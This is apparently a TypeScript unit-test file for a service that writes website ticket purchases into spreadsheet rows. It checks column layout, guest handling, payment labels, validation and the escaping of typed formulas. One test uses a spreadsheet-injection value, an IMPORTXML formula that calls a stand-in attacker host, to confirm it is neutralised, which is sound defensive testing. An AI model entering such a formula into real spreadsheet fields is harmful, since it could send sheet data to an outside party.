/**
 * A website ticket purchase -> its `tickets` row (ROADMAP W2).
 */
import { describe, it, expect } from "vitest";
import { TicketPurchase, ticketRowFromPurchase, MAX_FIELD_LENGTH } from "../services/ticketPurchaseRow";
import { parseAttendeeRows } from "../../src/lib/attendeeParsing";

/** Shaped like entry 1433 (a test purchase): 4 tickets, 3 guests, paying offline. */
function purchase(overrides: Partial<TicketPurchase> = {}): TicketPurchase {
  return {
    entryId: "1433",
    firstName: "Pat",
    lastName: "Lee",
    email: "pat@example.com",
    phone: "(608) 555-0100",
    tickets: 4,
    guests: [
      { firstName: "Sam", lastName: "Lee", email: "sam@example.com", ownBidderNumber: false },
      { firstName: "Jo", lastName: "Lee", email: "jo@example.com", ownBidderNumber: true },
      { firstName: "Ari", lastName: "Lee", email: "ari@example.com", ownBidderNumber: true },
    ],
    paymentMethod: "test",
    paymentStatus: "pending",
    total: 140,
    ...overrides,
  };
}

function rowOf(p: TicketPurchase) {
  const result = ticketRowFromPurchase(p);
  if ("problems" in result) throw new Error(result.problems.join(" "));
  return result.row;
}

describe("ticketRowFromPurchase", () => {
  it("lays the purchase out like the app's own rows: A-V, guests in H-S, the entry ID in W", () => {
    expect(rowOf(purchase())).toEqual([
      "Pat", "Lee", "pat@example.com", "(608) 555-0100", 4, "yes", "",
      "Sam", "Lee", "sam@example.com", "no",
      "Jo", "Lee", "jo@example.com", "yes",
      "Ari", "Lee", "ari@example.com", "yes",
      "Offline", "Pending", "$140",
      "1433",
    ]);
  });

  it("reads back through the app's own parser exactly as written", () => {
    const row = rowOf(purchase()).map(String);
    const [attendee] = parseAttendeeRows("tickets", [["header"], row]);
    expect(attendee).toMatchObject({
      firstName: "Pat", lastName: "Lee", email: "pat@example.com", ticketsPurchased: "4",
      paymentMethod: "Offline", paymentStatus: "Pending", totalPaid: "$140", formEntryId: "1433",
    });
    expect(attendee.guestsInfo.map((g) => [g.firstName, g.ownBidderNumber])).toEqual([["Sam", "no"], ["Jo", "yes"], ["Ari", "yes"]]);
  });

  it("writes a purchase with no guests with F and H-S blank", () => {
    const row = rowOf(purchase({ tickets: 1, guests: [] }));
    expect(row[5]).toBe("");
    expect(row.slice(7, 19).every((v) => v === "")).toBe(true);
  });

  it("drops the form's unused, blank guest slots", () => {
    const blank = { firstName: "", lastName: " ", email: "", ownBidderNumber: false };
    const row = rowOf(purchase({ tickets: 2, guests: [purchase().guests[0], blank, blank] }));
    expect(row.slice(7, 11)).toEqual(["Sam", "Lee", "sam@example.com", "no"]);
    expect(row.slice(11, 19).every((v) => v === "")).toBe(true);
  });

  it.each([
    ["paypal", "paid", "PayPal", "Pending"],
    ["test", "pending", "Offline", "Pending"],
    ["offline", "pending", "Offline", "Pending"],
    ["PayPal", "PAID", "PayPal", "Pending"],
    ["paypal", "processing", "PayPal", "Pending"],
    ["venmo", "refunded", "Venmo", "Refunded"],
    ["paypal", "", "PayPal", "Pending"],
  ])("labels method %s / status %s as %s / %s - never Paid until PayPal confirms it (W4)", (method, status, methodLabel, statusLabel) => {
    const row = rowOf(purchase({ paymentMethod: method, paymentStatus: status }));
    expect([row[19], row[20]]).toEqual([methodLabel, statusLabel]);
  });

  it("writes cents only when there are some", () => {
    expect(rowOf(purchase({ total: 70.5 }))[21]).toBe("$70.50");
  });

  it("never lets typed text run as a formula, and caps each field", () => {
    const row = rowOf(purchase({
      firstName: '=IMPORTXML("https://attacker.example","//x")',
      phone: "+1 608 555 0100",
      email: "x".repeat(MAX_FIELD_LENGTH + 50),
      paymentMethod: "=1+1",
    }));
    expect(row[0]).toBe(`'=IMPORTXML("https://attacker.example","//x")`);
    expect(row[3]).toBe("'+1 608 555 0100");
    expect(String(row[2])).toHaveLength(MAX_FIELD_LENGTH);
    expect(String(row[19]).startsWith("'")).toBe(true);
  });

  it.each([
    ["no entry ID", { entryId: "" }, "entry ID"],
    ["an entry ID that isn't a number", { entryId: "12a" }, "entry ID"],
    ["no last name", { lastName: " " }, "name is missing"],
    ["no tickets", { tickets: 0, guests: [] }, "number of tickets"],
    ["a fraction of a ticket", { tickets: 1.5, guests: [] }, "number of tickets"],
    ["too many tickets", { tickets: 21, guests: [] }, "number of tickets"],
    ["more guests than tickets", { tickets: 2 }, "3 guests but only 2"],
    ["a guest with only an email", { guests: [{ firstName: "", lastName: "", email: "who@example.com", ownBidderNumber: false }] }, "Guest 1 has no name"],
    ["a negative total", { total: -5 }, "order total"],
  ])("sends a purchase with %s to review instead of the sheet", (_label, overrides, problem) => {
    const result = ticketRowFromPurchase(purchase(overrides as Partial<TicketPurchase>));
    expect("problems" in result && result.problems.join(" ")).toContain(problem);
  });

  it("doesn't hold back a purchase for a missing email or phone - the purchase is still real", () => {
    expect("row" in ticketRowFromPurchase(purchase({ email: "", phone: "" }))).toBe(true);
  });
});
